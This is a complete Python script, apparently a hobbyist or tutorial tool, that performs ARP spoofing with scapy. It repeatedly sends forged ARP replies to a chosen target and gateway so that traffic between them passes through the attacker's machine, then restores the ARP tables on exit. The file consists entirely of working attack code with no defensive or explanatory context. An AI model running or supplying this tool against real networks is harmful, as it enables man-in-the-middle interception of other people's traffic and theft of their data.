#Arp spoofer

#!/usr/bin/env python
import time
import scapy.all as scapy
import optparse

def get_args():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_IP", help="Target IP address")
    parser.add_option("-g", "--gateway", dest="gateway_IP", help="Gateway IP address")
    (values, arguments) = parser.parse_args()
    if not values.target_IP:
        parser.error("[-] Please specify a target_IP, use --help for more info.")
    elif not values.gateway_IP:
        parser.error("[-] Please specify gateway_IP, use --help for more info.")
    return values

def MAC(ip):
    arp_req = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast / arp_req
    answered_packages_list = scapy.srp(arp_req_broadcast, timeout = 5, verbose=False)[0]
    return answered_packages_list[0][1].hwsrc

def spoofer(target_IP, spoof_IP):
    target_mac = MAC(target_IP)
    packet = scapy.ARP(op = 2, pdst = target_IP, hwdst = target_mac, psrc = spoof_IP)
    scapy.send(packet, verbose = False)

def restore(dst_IP, src_IP):
    dst_MAC=MAC(dst_IP)
    src_MAC = MAC(src_IP)
    packet = scapy.ARP(op=2, pdst=dst_IP, hwdst=dst_MAC, psrc=src_IP, hwsrc=src_MAC)
    scapy.send(packet, count = 4, verbose = False)

values = get_args()

try:
    count = 0
    while True:
        spoofer(values.target_IP, values.gateway_IP)
        spoofer(values.gateway_IP, values.target_IP)
        count += 2
        print("\r[+] Packets Sent: " + str(count), end = "")
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C  ... Resetting ARP Table.... Please Wait.\n")
    restore(values.target_IP, values.gateway_IP)
    restore(values.gateway_IP, values.target_IP)
